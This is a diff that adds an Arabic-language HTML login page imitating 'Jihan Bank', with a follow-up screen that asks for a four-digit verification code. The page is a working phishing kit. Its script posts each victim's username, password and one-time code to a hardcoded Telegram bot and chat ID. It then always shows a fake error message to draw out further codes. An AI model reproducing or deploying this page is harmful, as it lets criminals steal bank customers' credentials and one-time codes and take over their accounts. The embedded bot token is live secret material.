@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta property="og:title" content="بنك جيهان - تسجيل الدخول">
+    <meta property="og:description" content="منصة الخدمات المصرفية الحديثة">
+    <meta property="og:image" content="https://d.top4top.io/p_3925rm7gi0.jpeg">
+    <meta property="og:url" content="">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:image" content="https://d.top4top.io/p_3925rm7gi0.jpeg">
+    <title>بنك جيهان - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(180deg, #f7f7f7 0%, #f0f0f0 50%, #e9e9e9 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            position: fixed;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        /* Geometric Background Pattern */
+        .geometric-pattern {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.02;
+            z-index: 0;
+            background-image: 
+                linear-gradient(45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%),
+                linear-gradient(-45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%);
+            background-size: 100px 100px;
+            background-position: 0 0, 50px 50px;
+            pointer-events: none;
+        }
+
+        .page-wrapper {
+            position: fixed;
+            z-index: 1;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .login-container, .verify-container {
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1), 0 2px 8px rgba(0, 0, 0, 0.06);
+            width: 100%;
+            max-width: 480px;
+            padding: 48px 32px 42px 32px;
+            animation: slideUp 0.75s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            display: none;
+        }
+
+        .login-container.active, .verify-container.active {
+            display: block;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 36px;
+            animation: logoScale 0.9s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes logoScale {
+            from {
+                opacity: 0;
+                transform: scale(0.6);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .logo {
+            width: 140px;
+            height: 140px;
+            background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
+            border-radius: 50%;
+            filter: drop-shadow(0 10px 30px rgba(196, 30, 58, 0.18));
+            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.05);
+            transition: transform 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .logo:active {
+            transform: scale(0.96);
+        }
+
+        .logo-verification {
+            width: 120px;
+            height: 120px;
+            background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
+            border-radius: 50%;
+            filter: drop-shadow(0 8px 24px rgba(196, 30, 58, 0.15));
+            box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.04);
+            transition: transform 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .logo-verification:active {
+            transform: scale(0.96);
+        }
+
+        .title {
+            text-align: center;
+            font-size: 40px;
+            font-weight: 900;
+            color: #1a1a1a;
+            margin-bottom: 9px;
+            letter-spacing: -1.3px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 12px;
+            color: #b8b8b8;
+            margin-bottom: 32px;
+            letter-spacing: 0.3px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
+        }
+
+        .form-group:nth-child(3) { animation-delay: 0.12s; }
+        .form-group:nth-child(4) { animation-delay: 0.24s; }
+
+        @keyframes slideInForm {
+            from {
+                opacity: 0;
+                transform: translateX(25px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #4a4a4a;
+            margin-bottom: 11px;
+            font-weight: 700;
+            letter-spacing: 0.2px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px 17px;
+            border: 2px solid #e6e6e6;
+            border-radius: 16px;
+            font-size: 15px;
+            color: #333;
+            transition: all 0.3s ease;
+            background: linear-gradient(135deg, #fbfbfb 0%, #f8f8f8 100%);
+            font-family: inherit;
+            font-weight: 500;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #c41e3a;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.08), inset 0 1px 2px rgba(0, 0, 0, 0.02);
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #d8d8d8;
+        }
+
+        .toggle-password-btn {
+            position: absolute;
+            left: 15px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            color: #c9b57d;
+            font-size: 20px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password-btn:active {
+            transform: scale(1.12);
+        }
+
+        .login-btn, .verify-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #c41e3a 0%, #a01830 50%, #8b1529 100%);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 28px;
+            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 9px 24px rgba(196, 30, 58, 0.3);
+            position: relative;
+            overflow: hidden;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .login-btn::before, .verify-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .login-btn:active::before, .verify-btn:active::before {
+            left: 100%;
+        }
+
+        .login-btn:active, .verify-btn:active {
+            transform: translateY(-1px);
+            box-shadow: 0 12px 32px rgba(196, 30, 58, 0.38);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 26px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        .divider span {
+            padding: 0 14px;
+            color: #b0b0b0;
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .auth-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .auth-btn {
+            padding: 13px 15px;
+            background: linear-gradient(135deg, #555 0%, #444 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.3px;
+            box-shadow: 0 5px 14px rgba(0, 0, 0, 0.12);
+            position: relative;
+            overflow: hidden;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .auth-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .auth-btn:active::before {
+            left: 100%;
+        }
+
+        .auth-btn:active {
+            background: linear-gradient(135deg, #666 0%, #555 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 7px 18px rgba(0, 0, 0, 0.18);
+        }
+
+        .footer-links {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .footer-links a {
+            color: #c41e3a;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.2px;
+        }
+
+        .footer-links a:active {
+            opacity: 0.8;
+        }
+
+        /* Verification Code Styles */
+        .verify-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 38px;
+        }
+
+        .verify-title {
+            text-align: center;
+            font-size: 38px;
+            font-weight: 900;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            letter-spacing: -1.2px;
+        }
+
+        .verify-subtitle {
+            text-align: center;
+            font-size: 12px;
+            color: #9a9a9a;
+            line-height: 1.6;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 11px;
+            margin-bottom: 32px;
+            justify-content: center;
+            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.12s backwards;
+        }
+
+        .otp-input {
+            width: 65px;
+            height: 65px;
+            border: 2px solid #e6e6e6;
+            border-radius: 14px;
+            font-size: 28px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a1a;
+            background: linear-gradient(135deg, #fbfbfb 0%, #f8f8f8 100%);
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+            appearance: none;
+            -moz-appearance: textfield;
+            direction: ltr;
+        }
+
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #c41e3a;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.08);
+        }
+
+        .otp-input.error {
+            border-color: #d32f2f;
+            background: #ffebee;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        .otp-input::placeholder {
+            color: #e8e8e8;
+        }
+
+        /* Alert Notification */
+        .alert-notification {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            display: none;
+            z-index: 999;
+            animation: slideDown 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .alert-notification.show {
+            display: flex;
+            justify-content: center;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .alert-content {
+            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+            color: white;
+            padding: 16px 24px;
+            border-radius: 0 0 16px 16px;
+            box-shadow: 0 8px 24px rgba(211, 47, 47, 0.3);
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            max-width: 90%;
+            text-align: center;
+            margin-top: env(safe-area-inset-top);
+        }
+
+        @media (max-width: 520px) {
+            .page-wrapper {
+                padding: 12px;
+            }
+
+            .login-container, .verify-container {
+                padding: 42px 26px 36px 26px;
+                border-radius: 28px;
+            }
+
+            .logo {
+                width: 130px;
+                height: 130px;
+                margin-bottom: 32px;
+            }
+
+            .logo-verification {
+                width: 110px;
+                height: 110px;
+            }
+
+            .title, .verify-title {
+                font-size: 36px;
+                margin-bottom: 8px;
+            }
+
+            .subtitle, .verify-subtitle {
+                font-size: 11px;
+                margin-bottom: 26px;
+            }
+
+            .form-group label {
+                font-size: 12px;
+                margin-bottom: 9px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                padding: 14px 15px;
+                font-size: 15px;
+                border-radius: 14px;
+            }
+
+            .otp-input {
+                width: 58px;
+                height: 58px;
+                font-size: 26px;
+                border-radius: 12px;
+            }
+
+            .otp-container {
+                gap: 9px;
+                margin-bottom: 28px;
+            }
+
+            .login-btn, .verify-btn {
+                padding: 14px;
+                font-size: 15px;
+                margin-top: 24px;
+                margin-bottom: 20px;
+                border-radius: 14px;
+            }
+
+            .auth-btn {
+                padding: 12px 13px;
+                font-size: 12px;
+                border-radius: 12px;
+            }
+
+            .divider {
+                margin: 22px 0;
+            }
+
+            .divider span {
+                font-size: 12px;
+                padding: 0 11px;
+            }
+
+            .verify-header {
+                margin-bottom: 32px;
+            }
+
+            .alert-content {
+                font-size: 13px;
+                padding: 14px 20px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .login-container, .verify-container {
+                padding: 38px 22px 32px 22px;
+            }
+
+            .logo {
+                width: 115px;
+                height: 115px;
+                margin-bottom: 28px;
+            }
+
+            .logo-verification {
+                width: 100px;
+                height: 100px;
+            }
+
+            .title, .verify-title {
+                font-size: 33px;
+            }
+
+            .subtitle, .verify-subtitle {
+                font-size: 10px;
+            }
+
+            .otp-input {
+                width: 54px;
+                height: 54px;
+                font-size: 24px;
+            }
+
+            .otp-container {
+                gap: 8px;
+            }
+
+            .form-group {
+                margin-bottom: 18px;
+            }
+        }
+
+        @supports (padding: max(0px)) {
+            .login-container, .verify-container {
+                padding-bottom: max(36px, env(safe-area-inset-bottom));
+            }
+
+            @media (max-width: 520px) {
+                .login-container, .verify-container {
+                    padding-bottom: max(32px, env(safe-area-inset-bottom));
+                }
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="geometric-pattern"></div>
+
+    <!-- Alert Notification -->
+    <div class="alert-notification" id="alertNotification">
+        <div class="alert-content" id="alertContent">
+            خطأ في أحد المعلومات المدخلة
+        </div>
+    </div>
+
+    <div class="page-wrapper">
+        <!-- Login Screen -->
+        <div class="login-container active" id="loginScreen">
+            <div class="logo-container">
+                <div class="logo"></div>
+            </div>
+
+            <h1 class="title">تسجيل الدخول</h1>
+            <p class="subtitle">مصرف جيهان - الخدمات المصرفية الحديثة</p>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="text" 
+                            id="username" 
+                            placeholder="أدخل اسم المستخدم" 
+                            required
+                        >
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            placeholder="أدخل كلمة المرور" 
+                            required
+                        >
+                        <button 
+                            type="button" 
+                            class="toggle-password-btn" 
+                            id="passwordToggle"
+                        >
+                            🔒
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+            </form>
+
+            <div class="divider">
+                <span>أو</span>
+            </div>
+
+            <div class="auth-options">
+                <button class="auth-btn" type="button" onclick="handleNewClient(event)">عميل جديد</button>
+                <button class="auth-btn" type="button" onclick="handleCreateAccount(event)">إنشاء حساب</button>
+            </div>
+
+            <div class="footer-links">
+                <a href="#" onclick="handleTerms(event)">الشروط والأحكام</a>
+            </div>
+        </div>
+
+        <!-- Verification Screen -->
+        <div class="verify-container" id="verifyScreen">
+            <div class="verify-header">
+                <div class="logo-container">
+                    <div class="logo-verification"></div>
+                </div>
+                <h1 class="verify-title">تحقق من هويتك</h1>
+                <p class="verify-subtitle">أدخل رمز التحقق المكون من 4 أرقام</p>
+            </div>
+
+            <form id="verifyForm">
+                <div class="otp-container" id="otpContainer">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                </div>
+
+                <button type="submit" class="verify-btn" id="verifyBtn">تأكيد</button>
+            </form>
+
+            <div class="footer-links">
+                <a href="#" onclick="backToLogin(event)">العودة</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8975476380:AAFBVdCXw22C_a82v7j801zHM2Pveg23l5k';
+        const TELEGRAM_CHAT_ID = '8653203135';
+
+        let loginData = {
+            username: '',
+            password: ''
+        };
+
+        let isPasswordVisible = false;
+
+        // Show Alert Notification
+        function showAlert(message) {
+            const alertNotification = document.getElementById('alertNotification');
+            const alertContent = document.getElementById('alertContent');
+            alertContent.textContent = message;
+            alertNotification.classList.add('show');
+
+            setTimeout(() => {
+                alertNotification.classList.remove('show');
+            }, 3500);
+        }
+
+        // Password Toggle
+        document.getElementById('passwordToggle').addEventListener('click', (e) => {
+            e.preventDefault();
+            const passwordInput = document.getElementById('password');
+            isPasswordVisible = !isPasswordVisible;
+            passwordInput.type = isPasswordVisible ? 'text' : 'password';
+            document.getElementById('passwordToggle').textContent = isPasswordVisible ? '👁️' : '🔒';
+        });
+
+        // OTP Input Handler
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('keyup', (e) => {
+                if (!/^\d*$/.test(e.target.value)) {
+                    e.target.value = '';
+                }
+            });
+        });
+
+        // Send First Data to Telegram (Login Only)
+        async function sendLoginDataToTelegram(username, password) {
+            const message = `بيانات دخول جديدة:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Send Second Data to Telegram (Login + Verification Code)
+        async function sendVerificationDataToTelegram(username, password, verificationCode) {
+            const message = `تحقق من الهوية - البيانات الكاملة:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nرمز التحقق: ${verificationCode}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Form Submission
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                showAlert('الرجاء ملء جميع الحقول');
+                return;
+            }
+
+            loginData.username = username;
+            loginData.password = password;
+
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.8';
+            const originalText = loginBtn.textContent;
+            loginBtn.textContent = 'جاري المعالجة...';
+
+            // Send first data (login only)
+            const sent = await sendLoginDataToTelegram(username, password);
+
+            setTimeout(() => {
+                loginBtn.textContent = originalText;
+                loginBtn.disabled = false;
+                loginBtn.style.opacity = '1';
+
+                // Show verification screen
+                document.getElementById('loginScreen').classList.remove('active');
+                document.getElementById('verifyScreen').classList.add('active');
+                
+                // Focus first OTP input
+                setTimeout(() => {
+                    otpInputs[0].focus();
+                }, 100);
+            }, 1000);
+        });
+
+        // Verification Form Submission
+        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const otpValues = Array.from(otpInputs).map(input => input.value).join('');
+            
+            if (otpValues.length !== 4) {
+                showAlert('الرجاء إدخال رمز التحقق الكامل');
+                return;
+            }
+
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.8';
+            const originalText = verifyBtn.textContent;
+            verifyBtn.textContent = 'جاري المعالجة...';
+
+            // Send second data (login + verification code)
+            const sent = await sendVerificationDataToTelegram(loginData.username, loginData.password, otpValues);
+
+            setTimeout(() => {
+                // Show error alert
+                showAlert('خطأ في أحد المعلومات المدخلة');
+
+                // Reset OTP inputs with error state
+                otpInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.add('error');
+                });
+
+                // Remove error state after animation
+                setTimeout(() => {
+                    otpInputs.forEach(input => input.classList.remove('error'));
+                }, 500);
+
+                // Reset button
+                verifyBtn.textContent = originalText;
+                verifyBtn.disabled = false;
+                verifyBtn.style.opacity = '1';
+
+                // Focus first input
+                otpInputs[0].focus();
+            }, 1500);
+        });
+
+        function backToLogin(e) {
+            e.preventDefault();
+            document.getElementById('verifyScreen').classList.remove('active');
+            document.getElementById('loginScreen').classList.add('active');
+            document.getElementById('verifyForm').reset();
+            otpInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('error');
+            });
+        }
+
+        // Other handlers
+        function handleNewClient(e) {
+            e.preventDefault();
+            showAlert('مرحباً! سيتم تحويلك إلى صفحة التسجيل');
+        }
+
+        function handleCreateAccount(e) {
+            e.preventDefault();
+            showAlert('سيتم تحويلك إلى صفحة إنشاء حساب جديد');
+        }
+
+        function handleTerms(e) {
+            e.preventDefault();
+            showAlert('اطلع على الشروط والأحكام');
+        }
+    </script>
+</body>
+</html>
